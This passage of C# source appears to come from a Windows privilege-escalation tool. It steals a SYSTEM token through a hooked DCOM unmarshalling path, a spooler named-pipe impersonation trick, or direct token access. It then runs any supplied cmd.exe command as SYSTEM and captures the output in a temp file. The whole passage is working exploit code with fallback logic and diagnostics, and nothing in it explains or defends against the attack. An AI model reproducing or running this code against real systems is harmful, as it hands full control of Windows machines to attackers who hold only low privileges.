        new Thread(() => DCOMPipeServer(serverPipe)) { IsBackground = true }.Start();
        if (!_pipeReady.WaitOne(5000)) { _dcomDiag += ",pipeTimeout"; return false; }

        if (!HookOrcbDispatchTable()) return false;

        new Thread(() => TriggerUnmarshal()) { IsBackground = true }.Start();

        for (int w = 0; w < 15000 && !_got; w += 100) Thread.Sleep(100);

        _dcomDiag += ",hookCalls=" + _hookCallCount;
        RestoreOrcbHook();
        return _got;
    }

    static string Exec(string cmd)
    {
        if (_sysToken == IntPtr.Zero) return "ERR:NO_TOKEN";

        string tf = @"C:\Windows\Temp\" + Guid.NewGuid().ToString("N").Substring(0, 12) + ".t";
        try { File.WriteAllText(tf, ""); } catch { }

        string sysDir = Environment.GetFolderPath(Environment.SpecialFolder.System);
        var cl = new StringBuilder(sysDir + @"\cmd.exe /c (" + cmd + ") > " + "\"" + tf + "\"" + " 2>&1");
        var si = new SI(); si.cb = Marshal.SizeOf(si); PI pi;

        IntPtr envBlock = IntPtr.Zero;
        CreateEnvironmentBlock(out envBlock, _sysToken, false);
        uint flags = 0x08000000u | 0x00000400u;

        IntPtr impToken;
        DuplicateTokenEx(_sysToken, 0xF01FF, IntPtr.Zero, 2, 2, out impToken);
        ImpersonateLoggedOnUser(impToken);

        bool ok = CreateProcessAsUserW(_sysToken, null, cl, IntPtr.Zero, IntPtr.Zero, false, flags, envBlock, sysDir, ref si, out pi);
        if (!ok)
        {
            ok = CreateProcessWithTokenW(_sysToken, 0, null, cl, flags, envBlock, sysDir, ref si, out pi);
            if (!ok)
            {
                int err = Marshal.GetLastWin32Error();
                RevertToSelf(); CloseHandle(impToken);
                if (envBlock != IntPtr.Zero) DestroyEnvironmentBlock(envBlock);
                return "ERR:CREATEPROCESS:" + err;
            }
        }
        RevertToSelf(); CloseHandle(impToken);

        WaitForSingleObject(pi.hProc, 30000);
        string output = "";
        try { if (File.Exists(tf)) output = File.ReadAllText(tf).Trim(); }
        catch { }
        try { File.Delete(tf); } catch { }
        if (envBlock != IntPtr.Zero) DestroyEnvironmentBlock(envBlock);
        CloseHandle(pi.hProc); CloseHandle(pi.hThread);
        return output;
    }

    public static string Run(string cmd) { return Run(cmd, "auto"); }

    public static string Run(string cmd, string tech)
    {
        try
        {
            _got = false; _sysToken = IntPtr.Zero;
            string used = "";
            string diag = "";

            bool spoolerRunning = SpoolerUp();

            if (tech == "auto" || tech == "dcom")
            {
                if (RunDCOM()) used = "dcom";
                else diag += "dcom:" + _dcomDiag + ";";
            }
            if (!_got && (tech == "auto" || tech == "spooler"))
            {
                if (spoolerRunning)
                {
                    if (RunSpoofer(15000)) used = "spooler";
                    else diag += "spooler:pipe_ok_but_no_token;";
                }
                else diag += "spooler:service_not_running;";
            }
            if (!_got && (tech == "auto" || tech == "direct"))
            {
                if (RunDirect()) used = "direct";
                else diag += "direct:no_accessible_system_token;";
            }
            if (!_got)
            {
                string id = WindowsIdentity.GetCurrent().Name;
                return "FAIL:NO_SYSTEM_TOKEN|svc=" + id + "|spooler=" + (spoolerRunning ? "up" : "down")
                    + "|" + diag + "|pipe:" + _pipeDiag + "|direct:" + _lastDiag;
            }

            string result = Exec(cmd);
            if (_sysToken != IntPtr.Zero) { CloseHandle(_sysToken); _sysToken = IntPtr.Zero; }
            return "[" + used + "] " + result;
        }
        catch (Exception ex) { return "ERR:" + ex.GetType().Name + ":" + ex.Message; }
    }
}
